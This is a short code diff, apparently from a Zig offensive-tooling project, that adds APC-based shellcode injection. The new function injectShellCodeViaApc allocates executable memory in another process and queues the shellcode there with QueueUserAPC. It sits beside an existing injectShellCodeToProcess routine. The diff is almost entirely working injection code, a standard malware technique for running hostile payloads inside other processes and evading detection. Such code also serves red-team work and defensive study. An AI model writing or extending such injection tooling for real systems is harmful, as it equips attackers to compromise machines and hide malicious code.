@@ -16,6 +16,7 @@ const CloseHandle = win.CloseHandle;
 const WaitForSingleObject = win.WaitForSingleObject;
 const GetModuleHandleA = win.GetModuleHandleA;
 const GetProcAddress = win.GetProcAddress;
+const QueueUserAPC = win.QueueUserAPC;
 
 pub fn allocateMemory(comptime T: type, h_process: HANDLE, data: []const T) !*anyopaque {
     const data_size = (data.len + 1) * @sizeOf(T);
@@ -113,4 +114,13 @@ pub fn injectShellCodeToProcess(h_process: HANDLE, shell_code: []const u8) !void
     defer freeVirtualMemory(h_process, shell_code_region);
 
     try executeInNewThread(h_process, @ptrCast(shell_code_region), null);
+}
+
+pub fn injectShellCodeViaApc(h_process: HANDLE, h_thread: HANDLE, shell_code: []const u8) !void {
+    const shell_code_region = try allocateExecutableMemory(u8, h_process, shell_code);
+
+    if (QueueUserAPC(@ptrCast(shell_code_region), h_thread, 0) == 0) {
+        std.debug.print("[!] QueueUserAPC Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.QueueUserAPCFailed;
+    }
 }
